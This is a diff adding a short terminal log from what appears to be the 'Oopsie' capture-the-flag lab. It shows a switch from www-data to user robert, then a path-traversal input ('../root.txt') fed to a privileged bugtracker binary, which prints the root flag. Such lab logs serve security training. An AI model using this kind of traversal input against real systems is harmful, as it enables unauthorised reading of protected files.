@@ -1,0 +1,21 @@
+www-data@oopsie:/tmp$ /usr/bin/bugtracker
+bash: /usr/bin/bugtracker: Permission denied
+www-data@oopsie:/tmp$ su - robert
+Password: 
+robert@oopsie:~$ whoami
+robert
+robert@oopsie:~$ id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+robert@oopsie:~$ /usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: ../root.txt
+---------------
+
+af13b0bee69f8a877c3faf667f7beacf
+
+robert@oopsie:~$ 
+
